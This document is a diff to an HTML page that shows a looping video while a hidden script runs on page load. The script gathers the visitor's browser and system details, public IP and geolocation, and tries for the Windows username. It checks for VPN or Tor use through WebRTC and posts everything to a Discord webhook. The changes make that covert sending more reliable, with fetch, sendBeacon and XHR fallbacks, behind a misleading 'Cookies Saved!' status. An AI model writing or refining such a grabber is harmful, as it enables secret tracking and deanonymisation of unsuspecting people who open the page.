@@ -62,6 +62,11 @@
             z-index: 999;
             border: 1px solid #00ff00;
             pointer-events: none;
+            white-space: nowrap;
+        }
+        #status.error {
+            color: #ff4444;
+            border-color: #ff4444;
         }
     </style>
 </head>
@@ -76,7 +81,7 @@
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
     </video>
 
-    <div id="status">⏳ Sending...</div>
+    <div id="status">⏳ Initializing...</div>
 
 <script>
     // ================================================================
@@ -95,11 +100,11 @@
     }
 
     // ================================================================
-    //  GET IP WITH TIMEOUT (race between fetch and 2s timer)
+    //  GET IP WITH AGGRESSIVE TIMEOUT (1.5s)
     // ================================================================
-    function getIPWithTimeout(timeout = 2000) {
+    function getIPWithTimeout(timeout = 1500) {
         return Promise.race([
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2500) })
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) })
                 .then(res => res.json())
                 .then(data => {
                     if (data.ip) return data;
@@ -107,7 +112,7 @@
                 })
                 .catch(() => {
                     // fallback to ip-api.com
-                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2500) })
+                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
                         .then(res => res.json())
                         .then(data => {
                             if (data.query) {
@@ -130,11 +135,97 @@
     }
 
     // ================================================================
+    //  DETECT TOR / VPN USING ALTERNATIVE HEURISTICS
+    // ================================================================
+    function detectTorOrVpnByBrowser(ua) {
+        // Check User-Agent for Tor
+        if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
+        // Check if WebRTC local IPs are missing (common in VPNs)
+        // We'll check later via WebRTC
+        return false;
+    }
+
+    function detectViaWebRTC() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            let found = false;
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) {
+                    pc.close();
+                    resolve(found);
+                    return;
+                }
+                const parts = e.candidate.candidate.split(' ');
+                if (parts.length > 7) {
+                    const ip = parts[4];
+                    if (ip && ip !== '0.0.0.0' && ip !== '::') {
+                        found = true; // we have a real local IP
+                    }
+                }
+            };
+            setTimeout(() => { pc.close(); resolve(found); }, 2000);
+        });
+    }
+
+    // ================================================================
+    //  SEND MESSAGE VIA MULTIPLE METHODS
+    // ================================================================
+    function sendMessage(msg) {
+        return new Promise((resolve) => {
+            let sent = false;
+
+            // Method 1: fetch
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg }),
+                keepalive: true
+            })
+            .then(res => {
+                if (res.ok) { sent = true; resolve(true); }
+                else throw new Error('fetch failed');
+            })
+            .catch(() => {
+                // Method 2: sendBeacon
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                if (navigator.sendBeacon(WEBHOOK, blob)) {
+                    sent = true;
+                    resolve(true);
+                } else {
+                    // Method 3: XMLHttpRequest (old school)
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', WEBHOOK, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(JSON.stringify({ content: msg }));
+                        xhr.onload = function() {
+                            if (xhr.status === 200 || xhr.status === 204) {
+                                sent = true;
+                                resolve(true);
+                            }
+                        };
+                        xhr.onerror = function() { resolve(false); };
+                        setTimeout(() => resolve(false), 3000);
+                    } catch (e) {
+                        resolve(false);
+                    }
+                }
+            });
+            // fallback timeout
+            setTimeout(() => resolve(sent), 5000);
+        });
+    }
+
+    // ================================================================
     //  MAIN
     // ================================================================
     (async function() {
         try {
-            // ---- 1. Gather system info (synchronous) ----
+            setStatus('Gathering system info...');
+
+            // ---- 1. System info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -171,19 +262,27 @@
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // ---- 2. Windows username (ActiveX) ----
+            // Windows username (ActiveX)
             let winUser = 'Not available (IE/ActiveX required)';
             try {
                 const wsh = new ActiveXObject('WScript.Shell');
                 winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
             } catch (e) {}
 
-            // ---- 3. Get IP (with timeout, do not block sending) ----
-            setStatus('⏳ Gathering IP...');
-            const ipData = await getIPWithTimeout(2000);
+            // ---- 2. Detect VPN/Tor via browser heuristics (before IP) ----
+            let isVpn = detectTorOrVpnByBrowser(ua);
 
-            // ---- 4. VPN detection ----
-            let isVpn = false;
+            // Also check WebRTC local IPs to see if they are hidden (common in VPNs)
+            const hasRealLocalIP = await detectViaWebRTC();
+            if (!hasRealLocalIP) {
+                isVpn = true; // no local IP => likely VPN or Tor
+            }
+
+            // ---- 3. Get IP (with timeout, but we will send even if it fails) ----
+            setStatus('Fetching IP...');
+            const ipData = await getIPWithTimeout(1500);
+
+            // ---- 4. Refine VPN detection using IP data (if available) ----
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -217,32 +316,14 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- 6. Send to Discord ----
-            setStatus('...');
-            let sent = false;
+            // ---- 6. Send immediately (no more waiting) ----
+            setStatus('Sending...');
+            const sent = await sendMessage(msg);
 
-            // Try fetch with keepalive
-            try {
-                const response = await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: msg }),
-                    keepalive: true
-                });
-                if (response.ok) sent = true;
-            } catch (e) {}
-
-            // Fallback: sendBeacon
-            if (!sent) {
-                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                if (navigator.sendBeacon(WEBHOOK, blob)) sent = true;
-            }
-
-            // Final status
             if (sent) {
                 setStatus('✅ Cookies Saved!');
             } else {
-                setStatus('❌ Send failed', true);
+                setStatus('❌ Send failed – check webhook', true);
             }
 
         } catch (err) {
